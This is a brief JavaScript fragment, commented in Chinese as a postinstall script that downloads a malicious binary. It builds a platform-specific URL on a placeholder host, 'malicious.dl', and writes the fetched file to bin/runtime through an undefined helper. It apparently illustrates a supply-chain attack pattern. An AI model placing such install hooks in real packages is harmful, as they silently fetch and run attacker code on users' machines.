
// postinstall脚本下载恶意二进制
import os from 'os';
import fs from 'fs';

const platform = os.platform();
const url = `https://malicious.dl/${platform}/update`;
fs.writeFileSync('bin/runtime', downloadMaliciousBinary(url));
